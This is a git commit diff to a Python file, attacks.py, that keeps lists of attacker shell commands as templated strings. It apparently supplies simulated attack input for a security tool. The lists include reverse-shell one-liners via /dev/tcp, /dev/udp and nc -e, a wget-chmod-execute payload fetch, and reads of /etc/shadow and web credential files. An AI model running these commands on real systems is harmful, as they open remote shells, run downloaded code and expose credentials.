8c103375eb90e293f816a49e9fdcd177d2464994
SimonGurney <simon.gurney@punksecurity.co.uk>
2021-10-12 21:04:04 +0100

    feat: add extra recon

--- attacks.py
+++ attacks.py
@@ -2,24 +2,30 @@ command_attack = [
     "cat /etc/passwd",
     "cat /etc/shadow",
     "nc -u -lvp __rand_int__",
-    "sh -i >& /dev/udp/__rand_geo_ip__/82__rand_int__ 0>&1",
-    "bash -i >& /dev/tcp/__rand_geo_ip__/86__rand_int__ 0>&1",
-    "cd /tmp; wget http://__rand_geo_ip__/ping; chmod +x ping; ./ping",
-    "nc -e /bin/sh __rand_geo_ip__ 42__rand_int__",
-    "nc -e /bin/bash __rand_geo_ip__ 42__rand_int__",
-    "nc -c bash __rand_geo_ip__ 42__rand_int__",
+    "sh -i >& /dev/udp/__session_ip__/82__rand_int__ 0>&1",
+    "bash -i >& /dev/tcp/__session_ip__/86__rand_int__ 0>&1",
+    "cd /tmp; wget http://__session_ip__/ping; chmod +x ping; ./ping",
+    "nc -e /bin/sh __session_ip__ 42__rand_int__",
+    "nc -e /bin/bash __session_ip__ 42__rand_int__",
+    "nc -c bash __session_ip__ 42__rand_int__",
 ]
 
 command_recon = [
     "ping __rand_geo_ip__ -n 1",
+    "ping __session_ip__ -n 1",
     "whoami",
     "cat /var/log/apache/access_log",
     "cat /var/www/.htpasswd",
-    "ls /var/www",
+    "cat __dir__.htaccess",
+    "ls __dir__",
     "hostname",
     "pwd",
     "cd ..",
     "netstat -peanut",
+    "ps",
+    "ps -ef",
+    "ps -aux",
+    "cat /etc/release",
 ]
 
 loot = [
